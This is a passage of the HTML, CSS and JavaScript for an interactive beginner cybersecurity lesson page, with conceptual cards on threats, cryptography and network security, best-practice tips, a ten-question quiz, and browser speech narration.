}\n\n  /* TIPS */\n  .tip-list { display:grid; gap:12px; margin-bottom:28px; }\n  .tip {\n    background:var(--panel2);\n    border-left:3px solid var(--accent);\n    border-radius:0 8px 8px 0;\n    padding:14px 18px;\n    display:flex; align-items:flex-start; gap:14px;\n    font-size:0.9rem; line-height:1.5;\n  }\n  .tip .tip-num {\n    font-family:''Share Tech Mono'',monospace;\n    font-size:0.75rem; color:var(--accent); flex-shrink:0;\n    margin-top:2px;\n  }\n  .tip strong { color:#fff; display:block; margin-bottom:3px; }\n\n  /* QUIZ */\n  .quiz-header { text-align:center; margin-bottom:36px; }\n  .quiz-header h2 { font-family:''Exo 2'',sans-serif; font-size:1.8rem; font-weight:700; color:#fff; margin-bottom:8px; }\n  .quiz-header p { color:var(--dim); }\n  .quiz-score-display {\n    display:flex; justify-content:center; gap:32px; margin-bottom:32px;\n  }\n  .score-box {\n    text-align:center;\n    background:var(--panel); border:1px solid rgba(0,245,196,0.15);\n    border-radius:10px; padding:16px 28px;\n  }\n  .score-box .num { font-family:''Exo 2'',sans-serif; font-size:2.2rem; font-weight:900; color:var(--accent); }\n  .score-box .lbl { font-family:''Share Tech Mono'',monospace; font-size:0.65rem; color:var(--dim); letter-spacing:2px; }\n\n  .question-card {\n    background:var(--panel);\n    border:1px solid rgba(0,245,196,0.12);\n    border-radius:14px; padding:28px;\n    margin-bottom:20px;\n    animation: fadeIn 0.3s ease;\n  }\n  .q-num { font-family:''Share Tech Mono'',monospace; font-size:0.7rem; color:var(--accent); letter-spacing:2px; margin-bottom:10px; }\n  .q-text { font-family:''Exo 2'',sans-serif; font-size:1.15rem; font-weight:600; color:#fff; margin-bottom:20px; line-height:1.4; }\n  .options { display:grid; gap:10px; }\n  .option-btn {\n    text-align:left; padding:13px 18px;\n    background:rgba(255,255,255,0.03);\n    border:1px solid rgba(255,255,255,0.08);\n    border-radius:8px; color:var(--text);\n    font-family:''Rajdhani'',sans-serif; font-size:0.95rem;\n    cursor:pointer; transition:all 0.2s;\n    display:flex; align-items:center; gap:12px;\n  }\n  .option-btn:hover:not(:disabled) { border-color:var(--accent2); background:rgba(0,170,255,0.08); color:#fff; }\n  .option-btn.correct { border-color:var(--accent); background:rgba(0,245,196,0.12); color:var(--accent); }\n  .option-btn.wrong { border-color:var(--danger); background:rgba(255,51,102,0.1); color:var(--danger); }\n  .option-btn:disabled { cursor:default; }\n  .option-letter {\n    font-family:''Share Tech Mono'',monospace; font-size:0.8rem;\n    width:24px; height:24px; border-radius:4px;\n    border:1px solid currentColor; display:flex; align-items:center; justify-content:center;\n    flex-shrink:0; opacity:0.7;\n  }\n  .explanation {\n    margin-top:14px; padding:12px 16px;\n    background:rgba(0,245,196,0.05); border-left:3px solid var(--accent);\n    border-radius:0 8px 8px 0; font-size:0.88rem; color:var(--text);\n    display:none;\n  }\n  .explanation.show { display:block; animation:fadeIn 0.3s ease; }\n\n  .quiz-actions { display:flex; justify-content:center; gap:14px; margin-top:28px; flex-wrap:wrap; }\n  .btn {\n    font-family:''Exo 2'',sans-serif; font-weight:700;\n    font-size:0.95rem; letter-spacing:1px;\n    padding:13px 30px; border-radius:8px;\n    cursor:pointer; border:none; transition:all 0.25s;\n  }\n  .btn-primary {\n    background:linear-gradient(135deg,var(--accent),var(--accent2));\n    color:#020810;\n    box-shadow: 0 0 20px rgba(0,245,196,0.3);\n  }\n  .btn-primary:hover { transform:translateY(-2px); box-shadow:0 0 30px rgba(0,245,196,0.5); }\n  .btn-outline {\n    background:transparent;\n    border:1px solid rgba(0,245,196,0.3);\n    color:var(--accent);\n  }\n  .btn-outline:hover { background:rgba(0,245,196,0.08); border-color:var(--accent); }\n\n  /* RESULT */\n  .result-screen { text-align:center; padding:40px 20px; display:none; }\n  .result-screen.show { display:block; animation:fadeIn 0.5s ease; }\n  .result-grade {\n    font-family:''Exo 2'',sans-serif; font-size:5rem; font-weight:900;\n    background:linear-gradient(135deg,var(--accent),var(--accent2));\n    -webkit-background-clip:text; -webkit-text-fill-color:transparent;\n    margin-bottom:8px;\n  }\n  .result-msg { font-size:1.3rem; color:#fff; margin-bottom:8px; }\n  .result-sub { color:var(--dim); margin-bottom:32px; }\n  .result-breakdown { display:flex; justify-content:center; gap:20px; flex-wrap:wrap; margin-bottom:32px; }\n  .breakdown-item { background:var(--panel); border:1px solid rgba(0,245,196,0.12); border-radius:10px; padding:16px 24px; min-width:100px; }\n  .breakdown-item .val { font-family:''Exo 2'',sans-serif; font-size:2rem; font-weight:900; color:var(--accent2); }\n  .breakdown-item .key { font-family:''Share Tech Mono'',monospace; font-size:0.65rem; color:var(--dim); }\n\n  /* CERT */\n  .cert-badge {\n    display:inline-block;\n    border:2px solid var(--accent);\n    border-radius:50%;\n    width:100px; height:100px;\n    line-height:100px;\n    font-size:3rem;\n    margin-bottom:20px;\n    box-shadow: var(--glow), inset 0 0 30px rgba(0,245,196,0.05);\n  }\n\n  /* FOOTER */\n  footer {\n    text-align:center; padding:24px;\n    font-family:''Share Tech Mono'',monospace; font-size:0.7rem;\n    color:var(--dim); border-top:1px solid rgba(0,245,196,0.08);\n  }\n\n  /* Utility */\n  .text-accent { color:var(--accent); }\n  .text-danger { color:var(--danger); }\n  .info-banner {\n    background:rgba(0,170,255,0.06);\n    border:1px solid rgba(0,170,255,0.2);\n    border-radius:8px; padding:14px 18px;\n    font-size:0.88rem; color:var(--accent2);\n    margin-bottom:24px; display:flex; align-items:center; gap:10px;\n  }\n</style>\n</head>\n<body>\n\n<div class="topbar">\n  <div class="logo">CYBER<span>SEC</span>.ACADEMY</div>\n  <div class="progress-bar-wrap">\n    <span class="progress-label">PROGRESS</span>\n    <div class="progress-track"><div class="progress-fill" id="progressFill"></div></div>\n    <span class="progress-label" id="progressPct">0%</span>\n  </div>\n</div>\n\n<div class="hero">\n  <div class="hero-badge">// MODULE 01 — INTERACTIVE LEARNING</div>\n  <h1>Cybersecurity<br>Fundamentals</h1>\n  <p>Master the core concepts of digital security through interactive lessons and adaptive quizzes.</p>\n</div>\n\n<!-- NARRATION BAR -->\n<div style="max-width:820px;margin:0 auto 40px;padding:0 24px;">\n  <div class="narration-bar">\n    <button class="voice-btn" id="voiceBtn" onclick="toggleNarration()" title="Play/Pause narration">▶</button>\n    <div class="narration-text">\n      <span class="narration-label">// AI VOICE NARRATION</span>\n      <span id="narrationDisplay">Select a topic below and press play to hear the narration.</span>\n    </div>\n    <div class="voice-controls">\n      <button class="ctrl-btn" onclick="changeRate(-0.25)">−</button>\n      <button class="ctrl-btn" id="rateDisplay">1.0x</button>\n      <button class="ctrl-btn" onclick="changeRate(0.25)">+</button>\n    </div>\n  </div>\n</div>\n\n<!-- NAV TABS -->\n<div class="sections-nav">\n  <button class="sec-btn active" onclick="showSection(''intro'', this)">01 — INTRO</button>\n  <button class="sec-btn" onclick="showSection(''threats'', this)">02 — THREATS</button>\n  <button class="sec-btn" onclick="showSection(''crypto'', this)">03 — CRYPTOGRAPHY</button>\n  <button class="sec-btn" onclick="showSection(''network'', this)">04 — NETWORK SEC</button>\n  <button class="sec-btn" onclick="showSection(''practices'', this)">05 — BEST PRACTICES</button>\n  <button class="sec-btn" onclick="showSection(''quiz'', this)">06 — QUIZ TEST</button>\n</div>\n\n<div class="content-area">\n\n  <!-- SECTION 1: INTRO -->\n  <div class="section-panel active" id="sec-intro">\n    <div class="section-title"><span class="icon">🛡️</span> Introduction to Cybersecurity</div>\n    <div class="section-subtitle">Understanding the digital landscape and why security matters</div>\n    <div class="info-banner">ℹ️ Cybercrime is projected to cost the world <strong style="margin:0 4px;">$10.5 trillion</strong> annually by 2025 — making cybersecurity a critical global priority.</div>\n    <div class="cards-grid">\n      <div class="card">\n        <div class="card-icon">🔐</div>\n        <h3>What is Cybersecurity?</h3>\n        <p>The practice of protecting systems, networks, and programs from digital attacks that aim to access, alter, or destroy sensitive information.</p>\n        <span class="tag">FOUNDATIONAL</span>\n      </div>\n      <div class="card">\n        <div class="card-icon">🎯</div>\n        <h3>CIA Triad</h3>\n        <p><strong style="color:#fff">Confidentiality</strong> ensures data privacy. <strong style="color:#fff">Integrity</strong> ensures data accuracy. <strong style="color:#fff">Availability</strong> ensures systems are accessible.</p>\n        <span class="tag">CORE PRINCIPLE</span>\n      </div>\n      <div class="card">\n        <div class="card-icon">⚡</div>\n        <h3>Attack Surface</h3>\n        <p>The sum of all possible points where an attacker can enter or extract data from an environment — hardware, software, network, and human factors.</p>\n        <span class="tag warn">RISK CONCEPT</span>\n      </div>\n      <div class="card">\n        <div class="card-icon">👤</div>\n        <h3>Threat Actors</h3>\n        <p>Entities that pose threats: nation-states, criminal organizations, hacktivists, insiders, and script kiddies — each with different motivations.</p>\n        <span class="tag danger">THREAT</span>\n      </div>\n      <div class="card">\n        <div class="card-icon">📊</div>\n        <h3>Risk Management</h3>\n        <p>Identifying, assessing, and prioritizing risks then applying resources to minimize, control, and monitor the impact of security events.</p>\n        <span class="tag">STRATEGY</span>\n      </div>\n      <div class="card">\n        <div class="card-icon">🏛️</div>\n        <h3>Security Frameworks</h3>\n        <p>NIST CSF, ISO 27001, SOC 2, and CIS Controls provide structured approaches to managing and reducing cybersecurity risk in organizations.</p>\n        <span class="tag">COMPLIANCE</span>\n      </div>\n    </div>\n  </div>\n\n  <!-- SECTION 2: THREATS -->\n  <div class="section-panel" id="sec-threats">\n    <div class="section-title"><span class="icon">⚠️</span> Cyber Threats & Attack Types</div>\n    <div class="section-subtitle">Understanding the threat landscape and common attack vectors</div>\n    <table class="threat-table">\n      <thead>\n        <tr><th>THREAT TYPE</th><th>DESCRIPTION</th><th>SEVERITY</th><th>VECTOR</th></tr>\n      </thead>\n      <tbody>\n        <tr><td><strong>Phishing</strong></td><td>Deceptive emails/messages tricking users into revealing credentials</td><td><span class="sev high"></span>High</td><td>Email / Social</td></tr>\n        <tr><td><strong>Ransomware</strong></td><td>Malware encrypting data and demanding payment for decryption</td><td><span class="sev high"></span>Critical</td><td>Network / Email</td></tr>\n        <tr><td><strong>SQL Injection</strong></td><td>Inserting malicious SQL code into queries to manipulate databases</td><td><span class="sev high"></span>High</td><td>Web App</td></tr>\n        <tr><td><strong>DDoS Attack</strong></td><td>Overwhelming a service with traffic to render it unavailable</td><td><span class="sev med"></span>Medium</td><td>Network</td></tr>\n        <tr><td><strong>Man-in-the-Middle</strong></td><td>Intercepting communications between two parties secretly</td><td><span class="sev high"></span>High</td><td>Network</td></tr>\n        <tr><td><strong>Zero-Day Exploit</strong></td><td>Exploiting unknown vulnerabilities before patches exist</td><td><span class="sev high"></span>Critical</td><td>Software</td></tr>\n        <tr><td><strong>Social Engineering</strong></td><td>Manipulating humans psychologically to divulge information</td><td><span class="sev med"></span>Medium</td><td>Human</td></tr>\n        <tr><td><strong>Cross-Site Scripting</strong></td><td>Injecting malicious scripts into web pages viewed by users</td><td><span class="sev med"></span>Medium</td><td>Web App</td></tr>\n        <tr><td><strong>Insider Threat</strong></td><td>Malicious or negligent actions by employees or contractors</td><td><span class="sev high"></span>High</td><td>Internal</td></tr>\n        <tr><td><strong>Brute Force</strong></td><td>Systematically trying all passwords until the correct one is found</td><td><span class="sev low"></span>Low-Med</td><td>Auth System</td></tr>\n      </tbody>\n    </table>\n    <div class="cards-grid">\n      <div class="card">\n        <div class="card-icon">🦠</div>\n        <h3>Malware Categories</h3>\n        <p>Viruses, worms, trojans, spyware, adware, rootkits, and keyloggers — each with unique behaviors and propagation methods.</p>\n        <span class="tag danger">MALWARE</span>\n      </div>\n      <div class="card">\n        <div class="card-icon">🕷️</div>\n        <h3>APT (Advanced Persistent Threat)</h3>\n        <p>Long-term targeted attacks by sophisticated actors who gain and maintain unauthorized access over extended periods.</p>\n        <span class="tag danger">NATION-STATE</span>\n      </div>\n    </div>\n  </div>\n\n  <!-- SECTION 3: CRYPTOGRAPHY -->\n  <div class="section-panel" id="sec-crypto">\n    <div class="section-title"><span class="icon">🔑</span> Cryptography</div>\n    <div class="section-subtitle">The science of secure communication and data protection</div>\n    <div class="cards-grid">\n      <div class="card">\n        <div class="card-icon">🔄</div>\n        <h3>Symmetric Encryption</h3>\n        <p>Same key for encryption and decryption. Fast and efficient for large data. Examples: AES-256, DES, 3DES. Key distribution remains the main challenge.</p>\n        <span class="tag">AES / DES</span>\n      </div>\n      <div class="card">\n        <div class="card-icon">🔓</div>\n        <h3>Asymmetric Encryption</h3>\n        <p>Public key encrypts, private key decrypts. Solves key distribution. Used in HTTPS, email. Examples: RSA, ECC, Diffie-Hellman.</p>\n        <span class="tag">RSA / ECC</span>\n      </div>\n      <div class="card">\n        <div class="card-icon">#</div>\n        <h3>Hash Functions</h3>\n        <p>One-way functions producing fixed-size output (digest) from any input. Used for password storage and integrity checks. SHA-256, MD5 (deprecated), bcrypt.</p>\n        <span class="tag">SHA-256</span>\n      </div>\n      <div class="card">\n        <div class="card-icon">✍️</div>\n        <h3>Digital Signatures</h3>\n        <p>Provide authentication, non-repudiation, and integrity. Created with private key, verified with public key. Foundation of PKI infrastructure.</p>\n        <span class="tag">PKI</span>\n      </div>\n      <div class="card">\n        <div class="card-icon">🔒</div>\n        <h3>TLS / SSL</h3>\n        <p>Protocols securing communication over networks. TLS 1.3 is current standard. Provides confidentiality, integrity, and authentication for web traffic.</p>\n        <span class="tag">HTTPS</span>\n      </div>\n      <div class="card">\n        <div class="card-icon">🎲</div>\n        <h3>Quantum Cryptography</h3>\n        <p>Post-quantum algorithms (CRYSTALS-Kyber, CRYSTALS-Dilithium) preparing for quantum computers that could break current encryption.</p>\n        <span class="tag warn">EMERGING</span>\n      </div>\n    </div>\n  </div>\n\n  <!-- SECTION 4: NETWORK -->\n  <div class="section-panel" id="sec-network">\n    <div class="section-title"><span class="icon">🌐</span> Network Security</div>\n    <div class="section-subtitle">Protecting infrastructure, protocols, and data in transit</div>\n    <div class="cards-grid">\n      <div class="card">\n        <div class="card-icon">🧱</div>\n        <h3>Firewalls</h3>\n        <p>Network security devices monitoring and filtering traffic based on rules. Packet filtering, stateful inspection, and next-gen firewalls (NGFW) with deep packet inspection.</p>\n        <span class="tag">PERIMETER</span>\n      </div>\n      <div class="card">\n        <div class="card-icon">🚨</div>\n        <h3>IDS / IPS</h3>\n        <p>Intrusion Detection Systems monitor traffic; Intrusion Prevention Systems also block threats. Signature-based vs anomaly-based detection methods.</p>\n        <span class="tag">MONITORING</span>\n      </div>\n      <div class="card">\n        <div class="card-icon">🔌</div>\n        <h3>VPN</h3>\n        <p>Virtual Private Networks create encrypted tunnels over public networks. Protocols: IPSec, OpenVPN, WireGuard. Essential for remote work security.</p>\n        <span class="tag">TUNNEL</span>\n      </div>\n      <div class="card">\n        <div class="card-icon">🧩</div>\n        <h3>Network Segmentation</h3>\n        <p>Dividing networks into zones (DMZ, internal, management) to contain breaches and limit lateral movement by attackers. Zero Trust architecture.</p>\n        <span class="tag">ARCHITECTURE</span>\n      </div>\n      <div class="card">\n        <div class="card-icon">📡</div>\n        <h3>DNS Security</h3>\n        <p>DNSSEC prevents DNS spoofing. DNS filtering blocks malicious domains. DNS over HTTPS (DoH) encrypts queries to prevent eavesdropping.</p>\n        <span class="tag">PROTOCOL</span>\n      </div>\n      <div class="card">\n        <div class="card-icon">🔍</div>\n        <h3>Packet Analysis</h3>\n        <p>Tools like Wireshark analyze network traffic for anomalies. NetFlow analysis provides visibility into traffic patterns and potential threats.</p>\n        <span class="tag">FORENSICS</span>\n      </div>\n    </div>\n  </div>\n\n  <!-- SECTION 5: PRACTICES -->\n  <div class="section-panel" id="sec-practices">\n    <div class="section-title"><span class="icon">✅</span> Security Best Practices</div>\n    <div class="section-subtitle">Essential habits and strategies for maintaining a strong security posture</div>\n    <div class="tip-list">\n      <div class="tip"><span class="tip-num">01</span><div><strong>Multi-Factor Authentication (MFA)</strong>Always require at least two verification factors — something you know (password), have (phone), or are (biometric). MFA blocks 99.9% of automated attacks.</div></div>\n      <div class="tip"><span class="tip-num">02</span><div><strong>Principle of Least Privilege</strong>Grant users and systems only the minimum permissions required for their function. Regularly audit and revoke unnecessary access rights to reduce the blast radius of breaches.</div></div>\n      <div class="tip"><span class="tip-num">03</span><div><strong>Patch Management</strong>Apply security updates promptly. 60% of breaches involve unpatched vulnerabilities. Automate patching where possible and maintain an inventory of all assets.</div></div>\n      <div class="tip"><span class="tip-num">04</span><div><strong>Security Awareness Training</strong>Humans are the weakest link. Regular phishing simulations and training reduce click rates by up to 75%. Build a security-first culture organizationally.</div></div>\n      <div class="tip"><span class="tip-num">05</span><div><strong>Backups & Disaster Recovery</strong>Follow the 3-2-1 rule: 3 copies, 2 different media, 1 offsite. Test restoration regularly. Encrypted, immutable backups are critical for ransomware resilience.</div></div>\n      <div class="tip"><span class="tip-num">06</span><div><strong>Zero Trust Architecture</strong>Never trust, always verify. Authenticate every user and device regardless of location. Microsegmentation and continuous validation replace perimeter-based security.</div></div>\n      <div class="tip"><span class="tip-num">07</span><div><strong>Incident Response Planning</strong>Document and rehearse your IR plan. Define roles, communication protocols, and recovery steps. The average cost of a breach rises 58% without an IR plan.</div></div>\n      <div class="tip"><span class="tip-num">08</span><div><strong>Vulnerability Management</strong>Conduct regular penetration testing, vulnerability scans, and bug bounty programs. Prioritize remediation using CVSS scores and business impact assessment.</div></div>\n    </div>\n  </div>\n\n  <!-- SECTION 6: QUIZ -->\n  <div class="section-panel" id="sec-quiz">\n    <div class="quiz-header">\n      <h2>🧠 Knowledge Assessment</h2>\n      <p>Test your understanding of cybersecurity fundamentals</p>\n    </div>\n\n    <div class="quiz-score-display">\n      <div class="score-box"><div class="num" id="scoreNum">0</div><div class="lbl">SCORE</div></div>\n      <div class="score-box"><div class="num" id="qNumDisplay">1/10</div><div class="lbl">QUESTION</div></div>\n      <div class="score-box"><div class="num" id="streakNum">0</div><div class="lbl">STREAK 🔥</div></div>\n    </div>\n\n    <div id="quizContainer"></div>\n\n    <div class="result-screen" id="resultScreen">\n      <div class="cert-badge">🏆</div>\n      <div class="result-grade" id="resultGrade">A+</div>\n      <div class="result-msg" id="resultMsg">Outstanding Performance!</div>\n      <div class="result-sub" id="resultSub">You''ve demonstrated strong cybersecurity knowledge.</div>\n      <div class="result-breakdown">\n        <div class="breakdown-item"><div class="val" id="resCorrect">0</div><div class="key">CORRECT</div></div>\n        <div class="breakdown-item"><div class="val" id="resWrong">0</div><div class="key">INCORRECT</div></div>\n        <div class="breakdown-item"><div class="val" id="resPct">0%</div><div class="key">ACCURACY</div></div>\n      </div>\n      <div class="quiz-actions">\n        <button class="btn btn-primary" onclick="restartQuiz()">RETAKE QUIZ</button>\n        <button class="btn btn-outline" onclick="showSection(''intro'', document.querySelector(''.sec-btn''))">REVIEW LESSONS</button>\n      </div>\n    </div>\n\n    <div class="quiz-actions" id="quizActions">\n      <button class="btn btn-outline" onclick="speakCurrentQuestion()">🔊 READ ALOUD</button>\n    </div>\n  </div>\n\n</div>\n\n<footer>CYBERSEC.ACADEMY — FUNDAMENTALS MODULE // BUILD 2025.1 // SECURE YOUR FUTURE</footer>\n\n<script>\n// ─── NARRATION DATA ───────────────────────────────────────────────────────────\nconst narrations = {\n  intro: "Welcome to Cybersecurity Fundamentals. Cybersecurity is the practice of protecting systems, networks, and programs from digital attacks. The CIA Triad — Confidentiality, Integrity, and Availability — forms the core framework for all security decisions. Understanding threat actors, attack surfaces, and risk management is essential for building secure environments.",\n  threats: "Cyber threats come in many forms. Phishing attacks deceive users via fraudulent messages. Ransomware encrypts your data and demands payment. SQL Injection exploits web application vulnerabilities. Distributed Denial of Service attacks overwhelm services with traffic. Man-in-the-middle attacks intercept communications. Zero-day exploits target unknown vulnerabilities before patches exist.",\n  crypto: "Cryptography is the science of secure communication. Symmetric encryption uses one shared key — fast but requires secure key exchange. Asymmetric encryption uses public and private key pairs, solving key distribution. Hash functions create one-way fingerprints for integrity verification. TLS and SSL protocols secure web communications. Post-quantum cryptography prepares us for the quantum computing era.",\n  network: "Network security protects your infrastructure and data in transit. Firewalls filter traffic based on rules. Intrusion Detection and Prevention Systems monitor and block threats. VPNs create encrypted tunnels for remote access. Network segmentation isolates systems to contain breaches. Zero Trust architecture verifies every connection regardless of source.",\n  practices: "Security best practices are your daily defense. Always enable Multi-Factor Authentication — it blocks 99 percent of automated attacks. Apply the Principle of Least Privilege. Patch systems promptly. Train employees to recognize phishing. Follow the 3-2-1 backup rule. Implement Zero Trust principles. Have an Incident Response plan ready before you need it.",\n  quiz: "Time to test your knowledge! Answer the following questions to assess your understanding of cybersecurity fundamentals. Read each question carefully and select the best answer. Good luck, security professional!"\n};\n\nlet speechRate = 1.0;\nlet currentUtterance = null;\nlet isSpeaking = false;\nlet currentSection = ''intro'';\n\nfunction toggleNarration() {\n  if (isSpeaking) {\n    window.speechSynthesis.cancel();\n    isSpeaking = false;\n    document.getElementById(''voiceBtn'').textContent = ''▶'';\n    document.getElementById(''voiceBtn'').classList.remove(''speaking'');\n  } else {\n    speakText(narrations[currentSection]);\n  }\n}\n\nfunction speakText(text) {\n  window.speechSynthesis.cancel();\n  const utter = new SpeechSynthesisUtterance(text);\n  utter.rate = speechRate;\n  utter.pitch = 1.05;\n  utter.volume = 1;\n\n  // Pick a voice\n  const voices = window.speechSynthesis.getVoices();\n  const preferred = voices.find(v => v.name.includes(''Google'') && v.lang === ''en-US'')\n    || voices.find(v => v.lang === ''en-US'')\n    || voices[0];\n  if (preferred) utter.voice = preferred;\n\n  utter.onstart = () => {\n    isSpeaking = true;\n    document.getElementById(''voiceBtn'').textContent = ''⏸'';\n    document.getElementById(''voiceBtn'').classList.add(''speaking'');\n    document.getElementById(''narrationDisplay'').textContent = text.substring(0, 120) + ''...'';\n  };\n  utter.onend = utter.onerror = () => {\n    isSpeaking = false;\n    document.getElementById(''voiceBtn'').textContent = ''▶'';\n    document.getElementById(''voiceBtn'').classList.remove(''speaking'');\n  };\n  window.speechSynthesis.speak(utter);\n  currentUtterance = utter;\n}\n\nfunction changeRate(delta) {\n  speechRate = Math.max(0.5, Math.min(2.0, speechRate + delta));\n  document.getElementById(''rateDisplay'').textContent = speechRate.toFixed(1) + ''x'';\n  if (isSpeaking) { window.speechSynthesis.cancel(); isSpeaking = false; speakText(narrations[currentSection]); }\n}\n\n// Load voices async\nwindow.speechSynthesis.onvoiceschanged = () => {};\n\n// ─── SECTIONS ─────────────────────────────────────────────────────────────────\nconst sections = [''intro'',''threats'',''crypto'',''network'',''practices'',''quiz''];\n\nfunction showSection(name, btn) {\n  window.speechSynthesis.cancel(); isSpeaking = false;\n  document.getElementById(''voiceBtn'').textContent = ''▶'';\n  document.getElementById(''voiceBtn'').classList.remove(''speaking'');\n\n  sections.forEach(s => document.getElementById(''sec-''+s).classList.remove(''active''));\n  document.querySelectorAll(''.sec-btn'').forEach(b => b.classList.remove(''active''));\n\n  document.getElementById(''sec-''+name).classList.add(''active'');\n  if (btn) btn.classList.add(''active'');\n\n  currentSection = name;\n  document.getElementById(''narrationDisplay'').textContent = narrations[name].substring(0, 120) + ''...'';\n\n  // Update progress\n  const idx = sections.indexOf(name);\n  const pct = Math.round(((idx+1)/sections.length)*100);\n  document.getElementById(''progressFill'').style.width = pct + ''%'';\n  document.getElementById(''progressPct'').textContent = pct + ''%'';\n\n  if (name === ''quiz'') initQuiz();\n}\n\n// ─── QUIZ DATA ─────────────────────────────────────────────────────────────────\nconst quizData = [\n  {\n    q: "What does the ''C'' in the CIA Triad stand for?",\n    opts: ["Cyber", "Confidentiality", "Compliance", "Cryptography"],\n    ans: 1,\n    exp: "The CIA Triad stands for Confidentiality (data privacy), Integrity (data accuracy), and Availability (system accessibility)."\n  },\n  {\n    q: "Which type of attack involves overwhelming a server with traffic to make it unavailable?",\n    opts: ["Phishing", "SQL Injection", "DDoS Attack", "Man-in-the-Middle"],\n    ans: 2,\n    exp: "A Distributed Denial of Service (DDoS) attack floods a target with massive traffic from multiple sources, causing it to become unavailable to legitimate users."\n  },\n  {\n    q: "Asymmetric encryption uses which key pair for encryption and decryption?",\n    opts: ["Two private keys", "One shared secret key", "Public key (encrypt) + Private key (decrypt)", "Session key + Master key"],\n    ans: 2,\n    exp: "Asymmetric encryption uses a public key to encrypt data and a private key to decrypt it. This solves the key distribution problem inherent in symmetric encryption."\n  },\n  {\n    q: "What is the ''3-2-1'' backup rule?",\n    opts: [\n      "3 passwords, 2 devices, 1 cloud backup",\n      "3 copies, 2 different media types, 1 offsite",\n      "3 daily, 2 weekly, 1 monthly backup",\n      "3 encrypted, 2 compressed, 1 archived"\n    ],\n    ans: 1,\n    exp: "The 3-2-1 rule: Keep 3 total copies of data, on 2 different storage media, with 1 copy stored offsite. This ensures resilience against hardware failure, local disasters, and ransomware."\n  },\n  {\n    q: "What percentage of automated attacks is blocked by Multi-Factor Authentication?",\n    opts: ["50%", "75%", "90%", "99.9%"],\n    ans: 3,\n    exp: "According to Microsoft research, MFA blocks approximately 99.9% of automated credential attacks, making it one of the most effective security measures available."\n  },\n  {\n    q: "Which encryption algorithm is considered the current gold standard for symmetric encryption?",\n    opts: ["DES", "MD5", "AES-256", "SHA-1"],\n    ans: 2,\n    exp: "AES-256 (Advanced Encryption Standard with 256-bit keys) is the industry gold standard for symmetric encryption, used by governments and enterprises worldwide."\n  },\n  {\n    q: "What does ''Zero Trust'' security mean?",\n    opts: [\n      "Never use passwords",\n      "Trust internal network users completely",\n      "Never trust, always verify — authenticate every user and device",\n      "Use zero encryption"\n    ],\n    ans: 2,\n    exp: "Zero Trust is a security model that eliminates implicit trust. Every user, device, and connection must be authenticated and authorized regardless of whether they''re inside or outside the network perimeter."\n  },\n  {\n    q: "What type of attack inserts malicious SQL code into web application input fields?",\n    opts: ["XSS Attack", "SQL Injection", "Buffer Overflow", "CSRF Attack"],\n    ans: 1,\n    exp: "SQL Injection inserts malicious SQL code into application queries, potentially exposing or manipulating the entire database. It''s consistently ranked in the OWASP Top 10 web vulnerabilities."\n  },\n  {\n    q: "Which protocol version is the current standard for securing web communications?",\n    opts: ["SSL 3.0", "TLS 1.0", "TLS 1.2", "TLS 1.3"],\n    ans: 3,\n    exp: "TLS 1.3 (Transport Layer Security) is the current standard, offering improved security and performance. Older versions like SSL and TLS 1.0/1.1 have been deprecated due to vulnerabilities."\n  },\n  {\n    q: "What is the Principle of Least Privilege?",\n    opts: [\n      "Give all users administrator access for efficiency",\n      "Grant only the minimum permissions required for a user''s job function",\n      "Privilege users should have no password",\n      "Least experienced users get most access"\n    ],\n    ans: 1,\n    exp: "The Principle of Least Privilege (PoLP) dictates that users and systems should only have access to the resources they need — nothing more. This limits the damage if an account is compromised."\n  }\n];\n\nlet currentQ = 0, score = 0, answered = 0, streak = 0, wrongCount = 0;\n\nfunction initQuiz() {\n  currentQ = 0; score = 0; answered = 0; streak = 0; wrongCount = 0;\n  updateScoreDisplay();\n  document.getElementById(''resultScreen'').classList.remove(''show'');\n  document.getElementById(''quizContainer'').style.display = ''block'';\n  document.getElementById(''quizActions'').style.display = ''flex'';\n  renderQuestion();\n}\n\nfunction renderQuestion() {\n  const container = document.getElementById(''quizContainer'');\n  if (currentQ >= quizData.length) { showResult(); return; }\n\n  const q = quizData[currentQ];\n  const letters = [''A'',''B'',''C'',''D''];\n  document.getElementById(''qNumDisplay'').textContent = (currentQ+1)+''/''+quizData.length;\n\n  container.innerHTML = `\n    <div class="question-card">\n      <div class="q-num">// QUESTION ${String(currentQ+1).padStart(2,''0'')} OF ${quizData.length}</div>\n      <div class="q-text">${q.q}</div>\n      <div class="options">\n        ${q.opts.map((opt,i) => `\n          <button class="option-btn" onclick="selectAnswer(${i})" id="opt-${i}">\n            <span class="option-letter">${letters[i]}</span>\n            ${opt}\n          </button>\n        `).join('''')}\n      </div>\n      <div class="explanation" id="explanation">${q.exp}</div>\n    </div>\n  `;\n}\n\nfunction selectAnswer(idx) {\n  const q = quizData[currentQ];\n  const opts = document.querySelectorAll(''.option-btn'');\n  opts.forEach(b => b.disabled = true);\n  opts[q.ans].classList.add(''correct'');\n  document.getElementById(''explanation'').classList.add(''show'');\n\n  if (idx === q.ans) {\n    score++;  streak++;\n    speakText("Correct! " + q.exp);\n  } else {\n    opts[idx].classList.add(''wrong'');\n    streak = 0; wrongCount++;\n    speakText("Incorrect. The correct answer is: " + q.opts[q.ans] + ". " + q.exp);\n  }\n  answered++;\n  updateScoreDisplay();\n\n  setTimeout(() => {\n    currentQ++;\n    if (currentQ < quizData.length) renderQuestion();\n    else showResult();\n  }, 3200);\n}\n\nfunction updateScoreDisplay() {\n  document.getElementById(''scoreNum'').textContent = score;\n  document.getElementById(''streakNum'').textContent = streak;\n}\n\nfunction showResult() {\n  window.speechSynthesis.cancel();\n  document.getElementById(''quizContainer'').style.display = ''none'';\n  document.getElementById(''quizActions'').style.display = ''none'';\n\n  const pct = Math.round((score/quizData.length)*100);\n  const grade = pct >= 90 ? ''A+'' : pct >= 80 ? ''A'' : pct >= 70 ? ''B'' : pct >= 60 ? ''C'' : ''D'';\n  const msgs = {\n    ''A+'': [''Outstanding Performance!'',''You are a cybersecurity expert!''],\n    ''A'': [''Excellent Work!'',''Strong knowledge of security fundamentals.''],\n    ''B'': [''Good Job!'',''Solid understanding with room to grow.''],\n    ''C'': [''Not Bad!'',''Review the lessons to strengthen your skills.''],\n    ''D'': [''Keep Learning!'',''Revisit the modules for a better foundation.'']\n  };\n\n  document.getElementById(''resultGrade'').textContent = grade;\n  document.getElementById(''resultMsg'').textContent = msgs[grade][0];\n  document.getElementById(''resultSub'').textContent = msgs[grade][1];\n  document.getElementById(''resCorrect'').textContent = score;\n  document.getElementById(''resWrong'').textContent = wrongCount;\n  document.getElementById(''resPct'').textContent = pct + ''%'';\n  document.getElementById(''resultScreen'').classList.add(''show'');\n\n  